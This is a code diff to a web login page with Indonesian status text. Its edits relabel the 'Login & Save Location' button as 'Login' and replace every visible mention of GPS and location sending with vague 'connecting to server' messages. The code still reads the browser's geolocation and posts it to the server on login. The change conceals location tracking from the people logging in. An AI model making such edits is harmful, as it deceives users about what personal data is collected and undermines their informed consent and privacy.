@@ -64,10 +64,10 @@
   </style>
 </head>
 <body>
-  <h2>Login Admin</h2>
+  <h2>Login Chio Feeder</h2>
   <input id="username" placeholder="Username" required />
   <input id="password" type="password" placeholder="Password" required />
-  <button id="loginBtn">Login & Save Location</button>
+  <button id="loginBtn">Login</button>
   <pre id="status" class="status-processing"></pre>
 
   <script>
@@ -109,16 +109,16 @@
         return;
       }
 
-      setStatus('📍 Login berhasil. Mengambil lokasi GPS...');
+      setStatus('📍 Login berhasil. Menghubungkan ke server...');
 
       // 2️⃣ GPS browser
       if (!navigator.geolocation) {
-        setStatus('⚠️ Geolocation tidak didukung browser', 'error');
+        setStatus('⚠️ Koneksi tidak didukung browser', 'error');
         return;
       }
 
       navigator.geolocation.getCurrentPosition(async (pos) => {
-        setStatus('📍 Mengirim lokasi ke server...');
+        setStatus('📍 Koneksi ke server...');
 
         const payload = {
           username,
@@ -144,7 +144,7 @@
 
           if (saveRes.ok) {
             localStorage.setItem('username', saveRes.user);
-            setStatus('✅ Login & lokasi tersimpan!', 'success');
+            setStatus('✅ Login berhasil!', 'success');
             setTimeout(() => window.location.href = '/dashboard.html', 1000);
           } else {
             setStatus('❌ Gagal menyimpan lokasi', 'error');
